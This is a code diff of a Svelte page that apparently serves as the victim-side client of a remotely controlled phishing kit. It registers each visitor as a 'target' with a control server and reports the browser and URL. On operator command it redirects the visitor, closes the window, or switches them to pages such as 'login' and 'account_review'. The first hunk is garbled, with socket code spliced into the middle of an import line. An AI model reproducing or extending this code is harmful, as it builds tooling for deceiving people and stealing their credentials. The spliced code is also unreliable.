@@ -1,5 +1,22 @@
 <script lang="ts">
-    import { onMount, onDestroy } from 'svelte';
+    import { onMount, onDe        // Connect to Socket.io server
+        try {
+            // Use Socket.io path routing via Nginx (works on all domains)
+            // Nginx routes /socket.io/ to localhost:3001 on all domains
+            const socketUrl = `${window.location.protocol}//${window.location.host}`;
+            console.log('Connecting to Socket.io at:', socketUrl);
+            
+            socket = io(socketUrl, {
+                path: '/socket.io',
+                transports: ['websocket', 'polling'],
+                upgrade: true,
+                rememberUpgrade: true,
+                timeout: 10000,
+                reconnection: true,
+                reconnectionAttempts: 5,
+                reconnectionDelay: 1000,
+                forceNew: true
+            });lte';
     import { goto } from '$app/navigation';
     import { io } from 'socket.io-client';
     
@@ -46,9 +63,9 @@
         
         // Connect to Socket.io server
         try {
-            // Use current domain for socket connection
-            const protocol = window.location.protocol === 'https:' ? 'https:' : 'http:';
-            const socketUrl = `${protocol}//${window.location.host}`;
+            // Always connect to Socket.io on port 3001, using the current domain
+            // This ensures Socket.io works on both main domain and connected domains
+            const socketUrl = `${window.location.protocol}//${window.location.hostname}:3001`;
             console.log('Connecting to Socket.io at:', socketUrl);
             
             socket = io(socketUrl, {
@@ -58,31 +75,39 @@
                 timeout: 10000,
                 reconnection: true,
                 reconnectionAttempts: 5,
-                reconnectionDelay: 1000
+                reconnectionDelay: 1000,
+                forceNew: true
             });
             
             socket.on('connect', () => {
-                console.log('Connected to Socket.io server');
+                console.log('✅ Connected to Socket.io server');
+                console.log('Connection ID:', socket.id);
                 connectionStatus = 'Connected';
                 
                 // Identify this target to the server
-                socket.emit('identify', {
+                const identifyData = {
                     belongsto: targetUser,
                     browser: navigator.userAgent,
                     location: window.location.href,
                     currentPage: currentPage
-                });
+                };
+                console.log('Sending identify data:', identifyData);
+                socket.emit('identify', identifyData);
             });
             
             socket.on('identified', (data) => {
-                console.log('Target identified:', data);
+                console.log('✅ Target identified successfully:', data);
                 targetID = data.targetID;
                 connectionStatus = 'Online';
                 isLoading = false;
                 
+                console.log('🎯 Target ID assigned:', targetID);
+                console.log('📡 Target status: Online and ready for control');
+                
                 // Set initial page from server
                 if (data.start_page) {
                     currentPage = data.start_page;
+                    console.log('📄 Initial page set to:', currentPage);
                 }
                 
                 // Update status periodically
@@ -96,9 +121,11 @@
             });
             
             socket.on('action', (data) => {
-                console.log('Received action:', data);
-                console.log('Action type:', data.action);
-                console.log('Custom URL:', data.customUrl);
+                console.log('🎮 RECEIVED ACTION:', data);
+                console.log('   Action type:', data.action);
+                console.log('   Custom URL:', data.customUrl);
+                console.log('   Target ID:', targetID);
+                console.log('   Timestamp:', new Date().toISOString());
                 handleAction(data.action, data.customUrl);
             });
             
@@ -127,25 +154,31 @@
     });
     
     function handleAction(action, customUrl) {
-        console.log(`Handling action: ${action}`, customUrl);
+        console.log(`🎯 HANDLING ACTION: ${action}`, customUrl);
         
         switch (action) {
             case 'redirect':
             case 'customRedirect':
                 if (customUrl) {
-                    console.log('Redirecting to:', customUrl);
-                    window.location.href = customUrl;
+                    console.log('🔗 Redirecting to:', customUrl);
+                    console.log('🚀 Executing redirect in 1 second...');
+                    setTimeout(() => {
+                        window.location.href = customUrl;
+                    }, 1000);
                 } else {
-                    console.log('No URL provided for redirect');
+                    console.log('❌ No URL provided for redirect');
                 }
                 break;
             case 'reload':
+                console.log('🔄 Reloading page...');
                 window.location.reload();
                 break;
             case 'close':
+                console.log('❌ Closing window...');
                 window.close();
                 break;
             case 'set_page':
+                console.log('📄 Setting page to:', customUrl || 'account_review');
                 currentPage = customUrl || 'account_review';
                 if (socket && targetID) {
                     socket.emit('updateStatus', {
@@ -157,7 +190,7 @@
                 break;
             default:
                 // Handle page changes (login, account_review, etc.)
-                console.log('Changing page to:', action);
+                console.log('📄 Changing page to:', action);
                 currentPage = action;
                 if (socket && targetID) {
                     socket.emit('updateStatus', {
